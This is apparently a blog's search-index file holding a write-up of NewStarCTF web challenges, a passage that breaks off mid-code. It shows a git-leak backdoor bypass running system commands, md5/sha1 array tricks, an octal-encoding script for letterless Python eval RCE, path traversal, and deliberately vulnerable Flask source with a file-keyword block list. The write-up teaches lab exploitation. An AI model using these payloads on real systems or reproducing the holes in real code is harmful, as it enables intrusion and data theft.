<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2024NewStarCTF_WP_Web</title>
      <link href="/2024/12/28/2024NewStarCTF-WP-Web/"/>
      <url>/2024/12/28/2024NewStarCTF-WP-Web/</url>
      
        <content type="html"><![CDATA[<p>西电链接：</p><p><a href="https://ctf.xidian.edu.cn/">西电 CTF 终端</a></p><h1 id="Week-2"><a href="#Week-2" class="headerlink" title="Week 2"></a>Week 2</h1><h2 id="pangbai过家家-2"><a href="#pangbai过家家-2" class="headerlink" title="pangbai过家家(2)"></a>pangbai过家家(2)</h2><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-19-51.png" class=""><p>连接进入，叫清点泄露文件</p><p>首先用dirsearch扫一下目录</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-20-18.png" class=""><p>发现.git文件，确定为git泄露，用Githack把泄露的文件下载下来</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-23-18.png" class=""><p>log和branch都没有找到后门，还有可能的就是stash(临时保存区)了</p><p><a href="https://geek-docs.com/git/git-cmds/git-stash.html">Git – Stash命令|极客教程</a></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-25-21.png" class=""><p>发现后面，用stash apply将暂存区重新应用</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-29-56.png" class=""><p>找到后门文件源代码，发现是一个正则表达式绕过</p><p><mark>关键点1：<em>非法字符转换下划线</em></mark></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-28_23-33-33.png" class=""><p>故这里在提交payload时，NewStar_CTF.2024要写为NewStar[CTF.2024</p><p><mark>关键点2：<em>正则表达式首位检测绕过</em></mark></p><p>preg_match默认为单行模式，如果字符串末尾是换行符，则换行符会被当做行尾而不是字符串的一部分，但是在严格不等于!&#x3D;&#x3D;中，”Welcome”和”Welcome\n”是不等的，</p><p>所以这里构造的最终payload是 <u>NewStar[CTF.2024&#x3D;Welcome%0a</u>（%0a是换行符的url编码）</p><p>func&#x3D;system</p><p>args&#x3D;’ls &#x2F;‘</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-05-42.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-05-35.png" class=""><p>传入发现没有回显，猜测是ls &#x2F;被过滤了或者缺少权限（？其实我也不知道为什么），因为之前的flag大部分都在环境变量里，所以这里尝试用env语句打印环境变量</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-06-06.png" class=""><img src="/2024/12/28/2024NewStarCTF-WP-Web/Snipaste_2024-12-29_00-06-32.png" class=""><p>得到flag</p><h2 id="遗失的拉链"><a href="#遗失的拉链" class="headerlink" title="遗失的拉链"></a>遗失的拉链</h2><p>题目是拉链，想到zip，应该是一个.zip源码泄露，所以先扫一下目录看看</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip1.png" class=""><p>果然有，下载下来，拿到源代码</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip2.png" class=""><p>有一个php内容如下</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip3.png" class=""><p>是一个简单的比较绕过</p><p><em>sha_1和md5强相等，这个应该是很难找到两个字符符合要求的，所以想到传入两个数组，这样两个函数的返回值都是null，就可以强相等了，同时也绕过了不等号</em></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip4.png" class=""><p>代码里把cat和flag过滤了，我们用和cat效果差不多的more来读取文件，flag也不用打全，用通配符*即可</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/zip5.png" class=""><h1 id="week-3"><a href="#week-3" class="headerlink" title="week 3"></a>week 3</h1><h2 id="臭皮的计算器"><a href="#臭皮的计算器" class="headerlink" title="臭皮的计算器"></a>臭皮的计算器</h2><p>载入页面，叫我们去&#x2F;cal路径，来到这个路径后，查看源代码，发现后端flask源码直接给了</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cal2.png" class=""><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">s</span>):</span><br><span class="line">    token = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>:</span><br><span class="line">            token = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        num = request.form.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">        script = <span class="string">f&#x27;&#x27;&#x27;import os</span></span><br><span class="line"><span class="string">print(eval(&quot;<span class="subst">&#123;num&#125;</span>&quot;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(script)</span><br><span class="line">        <span class="keyword">if</span> waf(num):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                result_output = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                <span class="keyword">with</span> tempfile.NamedTemporaryFile(mode=<span class="string">&#x27;w+&#x27;</span>, suffix=<span class="string">&#x27;.py&#x27;</span>, delete=<span class="literal">False</span>) <span class="keyword">as</span> temp_script:</span><br><span class="line">                    temp_script.write(script)</span><br><span class="line">                    temp_script_path = temp_script.name</span><br><span class="line"></span><br><span class="line">                result = subprocess.run([<span class="string">&#x27;python3&#x27;</span>, temp_script_path], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">                os.remove(temp_script_path)</span><br><span class="line"></span><br><span class="line">                result_output = result.stdout <span class="keyword">if</span> result.returncode == <span class="number">0</span> <span class="keyword">else</span> result.stderr</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">                result_output = <span class="built_in">str</span>(e)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=result_output)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=<span class="string">&quot;臭皮！你想干什么！！&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;calc.html&quot;</span>, result=<span class="string">&#x27;试试呗&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">30002</span>)</span><br></pre></td></tr></table></figure><p>分析源码可得，我们输入num，程序自动计算num的表达式数值，且用到了eval函数，这里包含一个RCE漏洞，但关键在于，还有一个防火墙，过滤了所有字母，所以是一个无字母的RCE。</p><p>python的无字母rce，用的比较多的是八进制绕过，这里简单写一个程序把我们的payload转为八进制编码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">txt=<span class="built_in">input</span>(<span class="string">&quot;payload:&quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> txt:</span><br><span class="line">    <span class="keyword">if</span> i.isalpha() <span class="keyword">or</span> i==<span class="string">&#x27;_&#x27;</span> :</span><br><span class="line">        payload+=<span class="string">&#x27;\\&#x27;</span>+<span class="built_in">oct</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=i</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><img src="/2024/12/28/2024NewStarCTF-WP-Web/cal3.png" class=""><p>传入得到flag</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/cal4.png" class=""><h2 id="这照片是你吗"><a href="#这照片是你吗" class="headerlink" title="这照片是你吗"></a>这照片是你吗</h2><p>连入环境，日常看源代码找提示</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph1.png" class=""><p>这里不太看得明白其中的原理，但隐约感觉应该有任意文件读取的漏洞，这里随便试一下访问图片</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph2.png" class=""><p>看上去是可以用路径访问文件的，那么就得弄明白源代码在哪，继续收集信息发现</p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph3.png" class=""><p>这里的server是python，应该是flask，那么源代码应该是在app.py</p><p>而且一般flask的静态文件都放在和app.py同目录的static文件夹里，猜测可能当前目录就是static，试试路径穿透</p><p><em>注意这里不要直接在浏览器目录端口写..&#x2F;，会被过滤掉，要抓包后修改</em></p><img src="/2024/12/28/2024NewStarCTF-WP-Web/ph4.png" class=""><p>拿到源代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, render_template_string, request, redirect, send_file</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> get_random_number_string</span><br><span class="line"></span><br><span class="line">base_key = <span class="built_in">str</span>(uuid.uuid4()).split(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">secret_key = get_random_number_string(<span class="number">6</span>)</span><br><span class="line">admin_pass = <span class="string">&quot;&quot;</span>.join([ _ <span class="keyword">for</span> _ <span class="keyword">in</span> base_key])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(admin_pass)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">failure_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">users = &#123;</span><br><span class="line">    <span class="string">&#x27;admin&#x27;</span>: admin_pass,</span><br><span class="line">    <span class="string">&#x27;amiya&#x27;</span>: <span class="string">&quot;114514&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_token</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">global</span> failure_count</span><br><span class="line">        <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        <span class="keyword">if</span> data.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            failure_count += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> make_response(<span class="string">&quot;You are not admin!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/home&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">    password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">    <span class="keyword">global</span> failure_count</span><br><span class="line">    <span class="keyword">if</span> failure_count &gt;= <span class="number">100</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;You have tried too many times! Please restart the service!&quot;</span>, <span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> users.get(username)==password:</span><br><span class="line">        token = jwt.encode(&#123;<span class="string">&#x27;user&#x27;</span>: username, <span class="string">&#x27;exp&#x27;</span>: <span class="built_in">int</span>(time.time()) + <span class="number">600</span>&#125;, secret_key)</span><br><span class="line">        response = make_response(<span class="string">&#x27;Login success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">        response.set_cookie(<span class="string">&#x27;token&#x27;</span>, token)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        failure_count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> make_response(<span class="string">&#x27;Could not verify!&lt;br&gt;&lt;img src=&quot;/3.png&quot;&gt;&#x27;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    response = make_response(<span class="string">&#x27;Logout success!&lt;br&gt;&lt;a href=&quot;/home&quot;&gt;Go to homepage&lt;/a&gt;&#x27;</span>)</span><br><span class="line">    response.set_cookie(<span class="string">&#x27;token&#x27;</span>, <span class="string">&#x27;&#x27;</span>, expires=<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    logged_in = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        data = jwt.decode(token, secret_key, algorithms=[<span class="string">&quot;HS256&quot;</span>])</span><br><span class="line">        text = <span class="string">&quot;Hello, %s!&quot;</span> % data.get(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        logged_in = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        logged_in = <span class="literal">False</span></span><br><span class="line">        text = <span class="string">&quot;You have not logged in!&quot;</span></span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Home Page&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 图标能够正常显示耶! --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 但是我好像没有看到Nginx或者Apache之类的东西 --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 说明服务器脚本能够处理静态文件捏 --&gt;</span></span><br><span class="line"><span class="string">            &lt;!-- 那源码是不是可以用某些办法拿到呢! --&gt;</span></span><br><span class="line"><span class="string">            &#123;&#123; text &#125;&#125;&lt;br&gt;</span></span><br><span class="line"><span class="string">            &#123;% if logged_in %&#125;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot;&gt;登出&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &#123;% else %&#125;</span></span><br><span class="line"><span class="string">            &lt;h2&gt;登录&lt;/h2&gt;</span></span><br><span class="line"><span class="string">            &lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                用户名: &lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                密码: &lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;submit&quot; value=&quot;登录&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">            &lt;br&gt;</span></span><br><span class="line"><span class="string">            &#123;% if user==&quot;admin&quot; %&#125;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/admin&quot;&gt;Go to admin panel&lt;/a&gt;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;/2.png&quot;&gt;</span></span><br><span class="line"><span class="string">            &#123;% else %&#125;</span></span><br><span class="line"><span class="string">            &lt;img src=&quot;/1.png&quot;&gt;</span></span><br><span class="line"><span class="string">            &#123;% endif %&#125;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>, text=text, logged_in=logged_in, user=data.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> verify_token(token)</span><br><span class="line">        resp_text = render_template_string(<span class="string">r&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">            &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;head&gt;</span></span><br><span class="line"><span class="string">                &lt;title&gt;Admin Panel&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;/head&gt;</span></span><br><span class="line"><span class="string">            &lt;body&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Admin Panel&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;GET Server Info from api:&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;input type=&quot;input&quot; value=&#123;&#123;api_url&#125;&#125; id=&quot;api&quot; readonly&gt;</span></span><br><span class="line"><span class="string">                &lt;button onclick=execute()&gt;Execute&lt;/button&gt;</span></span><br><span class="line"><span class="string">                &lt;script&gt;</span></span><br><span class="line"><span class="string">                    function execute() &#123;</span></span><br><span class="line"><span class="string">                        fetch(&quot;&#123;&#123;url&#125;&#125;/execute?api_address=&quot;+document.getElementById(&quot;api&quot;).value,</span></span><br><span class="line"><span class="string">                                      &#123;credentials: &quot;include&quot;&#125;</span></span><br><span class="line"><span class="string">                                      ).then(res =&gt; res.text()).then(data =&gt; &#123;</span></span><br><span class="line"><span class="string">                            document.write(data);</span></span><br><span class="line"><span class="string">                        &#125;);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &lt;/script&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;</span></span><br><span class="line"><span class="string">            &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, api_url=request.host_url+<span class="string">&quot;/api&quot;</span>, url=request.host_url)</span><br><span class="line">        resp = make_response(resp_text)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;Token is invalid!&lt;br&gt;&lt;img src=&#x27;/3.png&#x27;&gt;&quot;</span>, <span class="number">401</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/execute&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    api_address = request.args.get(<span class="string">&quot;api_address&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> api_address:</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;No api address!&quot;</span>, <span class="number">400</span>)</span><br><span class="line">    response = requests.get(api_address, cookies=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;)</span><br><span class="line">    <span class="keyword">return</span> response.text</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api</span>():</span><br><span class="line">    token = request.cookies.get(<span class="string">&#x27;token&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> verify_token(token) != <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> verify_token(token)</span><br><span class="line">    resp = make_response(<span class="string">f&quot;Server Info: <span class="subst">&#123;os.popen(<span class="string">&#x27;uname -a&#x27;</span>).read()&#125;</span>&quot;</span>)</span><br><span class="line">    resp.headers[<span class="string">&#x27;Access-Control-Allow-Credentials&#x27;</span>] = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:file&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">static_file</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="built_in">print</span>(file)</span><br><span class="line">    restricted_keywords = [<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;sys&quot;</span>, <span class="string">&quot;log&quot;</span>, <span class="string">&quot;etc&quot;</span>, </span><br><span class="line">                           <span class="string">&quot;bin&quot;</span>, <span class="string">&quot;lib&quot;</span>, <span class="string">&quot;tmp&quot;</span>, <span class="string">&quot;var&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;dev&quot;</span>, <span class="string">&quot;home&quot;</span>, <span class="string">&quot;boot&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(keyword <span class="keyword">in</span> file <span class="keyword">for</span> keyword <span class="keyword">in</span> restricted_keywords):</span><br><span class="line">        <span class="keyword">return</span> make_response(<span class="string">&quot;STOP!&quot;</span>, <span class="number">404</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;./static/&quot;</span> + file):</span><br><span class="line">        <span class="keyword">return</span> 